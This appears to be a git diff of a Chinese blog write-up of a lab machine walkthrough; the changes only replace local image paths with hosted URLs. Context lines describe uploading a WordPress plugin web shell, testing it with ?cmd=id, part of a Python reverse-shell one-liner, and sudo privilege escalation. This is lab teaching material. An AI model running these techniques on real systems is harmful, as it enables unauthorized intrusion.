@@ -134,11 +134,11 @@ sudo feroxbuster --url http://10.0.2.8 -w /usr/share/dirb/wordlists/common.txt
 
 ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101622261.png)
 
-![image-20211010162325772](C:\Users\斯大帅\AppData\Roaming\Typora\typora-user-images\image-20211010162325772.png)
+![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121605746.png)
 
 修改完成过后我们回到浏览器页面再次刷新，发现这回速度很快，而且获取到了资源
 
-![image-20211010162432532](C:\Users\斯大帅\AppData\Roaming\Typora\typora-user-images\image-20211010162432532.png)
+![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121606828.png)
 
 但是高兴太早了，经过我的一番测试，并没有在该页面和链接处发现明显的漏洞，于是我回到了之前的隐藏目录，发现了这样一个路径`http://10.0.2.8/wordpress/wp-admin`似乎是后台登陆页面。
 
@@ -193,7 +193,7 @@ sudo feroxbuster --url http://10.0.2.8 -w /usr/share/dirb/wordlists/common.txt
   - 收现在kali编写插件 shell.php（必须包含头部信息，否则无法识别）![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101929132.png)
   - 要注意压缩成zip格式的文件才能上传，使用命令`zip shell.zip shell.php`进行压缩![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101933884.png)
   - 接下去进行上传，注意要记得激活插件![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101934249.png)
-  - 它的存储路径在`10.0.2.8/wordpress/wp-content/plugins/shell.php`我们可以在它之后加上id命令来查看是否成功，上句末尾加上`?cmd=id`进行查看![image-20211010194021212](C:\Users\斯大帅\AppData\Roaming\Typora\typora-user-images\image-20211010194021212.png)
+  - 它的存储路径在`10.0.2.8/wordpress/wp-content/plugins/shell.php`我们可以在它之后加上id命令来查看是否成功，上句末尾加上`?cmd=id`进行查看![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121606565.png)
 
   至此Wordpress漏洞利用成功，我们接下来就要拿到反弹shell。
 
@@ -210,7 +210,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 pty.spawn("/bin/bash")'
 ```
 
-​	![image-20211010200624944](C:\Users\斯大帅\AppData\Roaming\Typora\typora-user-images\image-20211010200624944.png)
+![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121607576.png)
 
 成功获得反弹shell。
 
@@ -300,7 +300,7 @@ pty.spawn("/bin/bash")'
 
 发现了一个wpadmin账号，这应该是管理员账号了，我们查看它的文件夹
 
-![image-20211010232331940](C:\Users\斯大帅\AppData\Roaming\Typora\typora-user-images\image-20211010232331940.png)
+![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121607859.png)
 
 发现只能由他自己才能查看，因此，提权成为唯一出路。
 
@@ -338,7 +338,7 @@ pty.spawn("/bin/bash")'
 
 ​	我们使用命令`sudo -l`发现了提权的方法
 
-![image-20211010235739103](C:\Users\斯大帅\AppData\Roaming\Typora\typora-user-images\image-20211010235739103.png)
+![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121608574.png)
 
 我们发现我们不用密码就能执行这条命令，而且是root权限
 
